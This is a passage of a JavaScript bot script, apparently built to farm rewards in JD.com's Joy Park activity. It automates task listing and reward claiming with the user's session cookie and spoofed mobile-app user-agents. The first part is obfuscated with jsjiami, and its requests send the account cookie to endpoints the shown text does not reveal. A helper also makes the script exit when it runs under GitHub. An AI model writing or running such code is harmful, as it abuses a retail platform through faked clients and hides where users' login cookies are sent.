_0x163071*_0x4bc92c;},'yllaB':_0x5df1('‮2f','P#@u'),'gopLH':function(_0x4d8e47,_0x85fb2c){return _0x4d8e47(_0x85fb2c);},'Gfasm':_0x5df1('‫30',')YfD'),'NoLmP':'JSUA','xydpN':'\x27jdltapp;iPad;3.1.0;14.4;network/wifi;Mozilla/5.0\x20(iPad;\x20CPU\x20OS\x2014_4\x20like\x20Mac\x20OS\x20X)\x20AppleWebKit/605.1.15\x20(KHTML,\x20like\x20Gecko)\x20Mobile/15E148;supportJDSHWK/1','hPPEi':function(_0x42bd70,_0x163c49){return _0x42bd70(_0x163c49);},'rZjnO':_0x5df1('‫31','2IVQ')};let _0x37be09=[_0x269b90[_0x5df1('‫32','ibss')],_0x5df1('‫33','bVsI')][Math[_0x5df1('‫34','d%$7')](_0x269b90['vYoqq'](Math[_0x5df1('‫35','Aq5V')](),0x2))];let _0x52569b={'Host':_0x269b90[_0x5df1('‫36','lQL4')],'accept':'application/json,\x20text/plain,\x20*/*','content-type':_0x5df1('‮37','j]%N'),'user-agent':$['isNode']()?process['env'][_0x5df1('‫38','aWZg')]?process['env']['JS_USER_AGENT']:_0x269b90['gopLH'](require,_0x269b90['Gfasm'])[_0x5df1('‫39','aFUj')]:$['getdata'](_0x5df1('‫3a','lWvK'))?$['getdata'](_0x269b90[_0x5df1('‫3b',']zS(')]):_0x269b90[_0x5df1('‫3c','KVn6')],'Cookie':cookie};let _0x7930ee=_0x5df1('‮3d','ifJ0')+_0x269b90[_0x5df1('‫3e','fsq!')](encodeURIComponent,_0x37be09)+_0x5df1('‮3f','GtTf')+Date['now']();var _0x4ee51a={'url':_0x269b90[_0x5df1('‫40','&m0B')],'headers':_0x52569b,'body':_0x7930ee};$[_0x5df1('‫41','aAKP')](_0x4ee51a,(_0x304b57,_0x348397,_0x3547d8)=>{});}function apDoTask4(){var _0x2b4517={'SluKk':_0x5df1('‫42','wsjB'),'ufPyC':_0x5df1('‫43','&m0B'),'vrTon':function(_0x266a33,_0x5c33b7){return _0x266a33(_0x5c33b7);},'aMRxW':_0x5df1('‫44','ifJ0'),'cMoMA':_0x5df1('‫45','&3QL')};let _0xfcd652=+new Date();let _0x5b6bc1=_0x2b4517[_0x5df1('‫46','(ymn')];var _0x3b2bfc={'Host':_0x5df1('‮47','ifJ0'),'accept':_0x5df1('‫48','&m0B'),'content-type':_0x2b4517[_0x5df1('‫49','bVsI')],'user-agent':$[_0x5df1('‮4a','*gpL')]()?process[_0x5df1('‮4b','zNtz')][_0x5df1('‫4c','(ymn')]?process[_0x5df1('‮4d','GtTf')][_0x5df1('‫38','aWZg')]:_0x2b4517[_0x5df1('‫4e','ifJ0')](require,_0x5df1('‮4f','ntjZ'))[_0x5df1('‫50','wsjB')]:$[_0x5df1('‮51','w!@q')](_0x2b4517[_0x5df1('‫52','#e7x')])?$['getdata'](_0x5df1('‫53','aFUj')):_0x2b4517['cMoMA'],'Cookie':cookie};var _0x55054f=_0x5df1('‮54','CNax')+encodeURIComponent(_0x5b6bc1)+_0x5df1('‫55','bpn5')+_0xfcd652;var _0x533e5f={'url':_0x5df1('‫56','A3@q')+ +new Date(),'headers':_0x3b2bfc,'body':_0x55054f};$['post'](_0x533e5f,(_0x276955,_0x5617a0,_0xcb73f3)=>{});}function taskPost(_0x360eca,_0x343789){var _0x5ab988={'EyKoL':_0x5df1('‮57','bpn5')};return{'url':_0x5df1('‮58','*gpL'),'body':'functionId='+_0x360eca+'&body='+encodeURIComponent(_0x343789)+_0x5df1('‫59','2RrD'),'headers':{'User-Agent':_0x5ab988[_0x5df1('‫5a','&3Bx')],'Content-Type':_0x5df1('‫5b','&3Bx'),'Host':_0x5df1('‮5c','lWvK'),'Origin':_0x5df1('‫5d',']zS('),'Referer':_0x5df1('‮5e','Aq5V'),'Cookie':cookie}};};_0xodE='jsjiami.com.v6';

function apTaskDetail(taskId, taskType) {
  //await $.wait(20)
  return new Promise(resolve => {
    $.post(taskPostClientActionUrl(`functionId=apTaskDetail&body={"taskType":"${taskType}","taskId":${taskId},"channel":4,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}&appid=activities_platform`, `apTaskDetail`), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          data = JSON.parse(data);
          if (!data.success) {
            $.taskDetailList = []
          } else {
            $.taskDetailList = data.data.taskItemList;
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        if (!data.success) {
          resolve([]);
        } else {
          resolve(data.data.taskItemList);
        }
      }
    })
  })
}

function apTaskDrawAward(taskId, taskType) {
  //await $.wait(20)
  return new Promise(resolve => {
    $.post(taskPostClientActionUrl(`body={"taskType":"${taskType}","taskId":${taskId},"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}&appid=activities_platform`, `apTaskDrawAward`), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          data = JSON.parse(data);
          $.log("领取奖励")
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

function taskPostClientActionUrl(body, functionId) {
  return {
    url: `https://api.m.jd.com/client.action?${functionId ? `functionId=${functionId}` : ``}`,
    body: body,
    headers: {
      'User-Agent': 'jdltapp;iPhone;3.5.6;14.6;eac3e15e91fd380664fc7c788e8ab6a07805646d;network/4g;ADID/8F6CAEEA-5BF7-4F7E-86C3-A641C19CA832;hasUPPay/0;pushNoticeIsOpen/0;lang/zh_CN;model/iPhone13,2;addressid/1995295948;hasOCPay/0;appBuild/1070;supportBestPay/0;pv/41.26;apprpd/;ref/JDLTSubMainPageViewController;psq/2;ads/;psn/eac3e15e91fd380664fc7c788e8ab6a07805646d|112;jdv/0|kong|t_500509960_|jingfen|bb9c79e4c4174521873879a27a707da4|1625071927291|1625071930;adk/;app_device/IOS;pap/JA2020_3112531|3.5.6|IOS 14.6;Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Host': 'api.m.jd.com',
      'Origin': 'https://joypark.jd.com',
      'Referer': 'https://joypark.jd.com/?activityId=LsQNxL7iWDlXUs6cFl-AAg&lng=113.387899&lat=22.512678&sid=4d76080a9da10fbb31f5cd43396ed6cw&un_area=19_1657_52093_0',
      'Cookie': cookie,
    }
  }
}

function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
// prettier-ignore
function Env(t, e) { "undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0); class s { constructor(t) { this.env = t } send(t, e = "GET") { t = "string" == typeof t ? { url: t } : t; let s = this.get; return "POST" === e && (s = this.post), new Promise((e, i) => { s.call(this, t, (t, s, r) => { t ? i(t) : e(s) }) }) } get(t) { return this.send.call(this.env, t) } post(t) { return this.send.call(this.env, t, "POST") } } return new class { constructor(t, e) { this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `🔔${this.name}, 开始!`) } isNode() { return "undefined" != typeof module && !!module.exports } isQuanX() { return "undefined" != typeof $task } isSurge() { return "undefined" != typeof $httpClient && "undefined" == typeof $loon } isLoon() { return "undefined" != typeof $loon } toObj(t, e = null) { try { return JSON.parse(t) } catch { return e } } toStr(t, e = null) { try { return JSON.stringify(t) } catch { return e } } getjson(t, e) { let s = e; const i = this.getdata(t); if (i) try { s = JSON.parse(this.getdata(t)) } catch { } return s } setjson(t, e) { try { return this.setdata(JSON.stringify(t), e) } catch { return !1 } } getScript(t) { return new Promise(e => { this.get({ url: t }, (t, s, i) => e(i)) }) } runScript(t, e) { return new Promise(s => { let i = this.getdata("@chavy_boxjs_userCfgs.httpapi"); i = i ? i.replace(/\n/g, "").trim() : i; let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout"); r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r; const [o, h] = i.split("@"), n = { url: `http://${h}/v1/scripting/evaluate`, body: { script_text: t, mock_type: "cron", timeout: r }, headers: { "X-Key": o, Accept: "*/*" } }; this.post(n, (t, e, i) => s(i)) }).catch(t => this.logErr(t)) } loaddata() { if (!this.isNode()) return {}; { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e); if (!s && !i) return {}; { const i = s ? t : e; try { return JSON.parse(this.fs.readFileSync(i)) } catch (t) { return {} } } } } writedata() { if (this.isNode()) { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e), r = JSON.stringify(this.data); s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r) } } lodash_get(t, e, s) { const i = e.replace(/\[(\d+)\]/g, ".$1").split("."); let r = t; for (const t of i) if (r = Object(r)[t], void 0 === r) return s; return r } lodash_set(t, e, s) { return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t) } getdata(t) { let e = this.getval(t); if (/^@/.test(t)) { const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : ""; if (r) try { const t = JSON.parse(r); e = t ? this.lodash_get(t, i, "") : e } catch (t) { e = "" } } return e } setdata(t, e) { let s = !1; if (/^@/.test(e)) { const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i), h = i ? "null" === o ? null : o || "{}" : "{}"; try { const e = JSON.parse(h); this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i) } catch (e) { const o = {}; this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i) } } else s = this.setval(t, e); return s } getval(t) { return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null } setval(t, e) { return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null } initGotEnv(t) { this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar)) } get(t, e = (() => { })) { t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.get(t, (t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i) })) : this.isQuanX() ? (this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => e(t))) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, e) => { try { if (t.headers["set-cookie"]) { const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString(); s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar } } catch (t) { this.logErr(t) } }).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => { const { message: s, response: i } = t; e(s, i, i && i.body) })) } post(t, e = (() => { })) { if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.post(t, (t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i) }); else if (this.isQuanX()) t.method = "POST", this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => e(t)); else if (this.isNode()) { this.initGotEnv(t); const { url: s, ...i } = t; this.got.post(s, i).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => { const { message: s, response: i } = t; e(s, i, i && i.body) }) } } time(t, e = null) { const s = e ? new Date(e) : new Date; let i = { "M+": s.getMonth() + 1, "d+": s.getDate(), "H+": s.getHours(), "m+": s.getMinutes(), "s+": s.getSeconds(), "q+": Math.floor((s.getMonth() + 3) / 3), S: s.getMilliseconds() }; /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length))); for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length))); return t } msg(e = t, s = "", i = "", r) { const o = t => { if (!t) return t; if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? { "open-url": t } : this.isSurge() ? { url: t } : void 0; if ("object" == typeof t) { if (this.isLoon()) { let e = t.openUrl || t.url || t["open-url"], s = t.mediaUrl || t["media-url"]; return { openUrl: e, mediaUrl: s } } if (this.isQuanX()) { let e = t["open-url"] || t.url || t.openUrl, s = t["media-url"] || t.mediaUrl; return { "open-url": e, "media-url": s } } if (this.isSurge()) { let e = t.url || t.openUrl || t["open-url"]; return { url: e } } } }; if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) { let t = ["", "==============📣系统通知📣=============="]; t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t) } } log(...t) { t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator)) } logErr(t, e) { const s = !this.isSurge() && !this.isQuanX() && !this.isLoon(); s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t) } wait(t) { return new Promise(e => setTimeout(e, t)) } done(t = {}) { const e = (new Date).getTime(), s = (e - this.startTime) / 1e3; this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t) } }(t, e) }
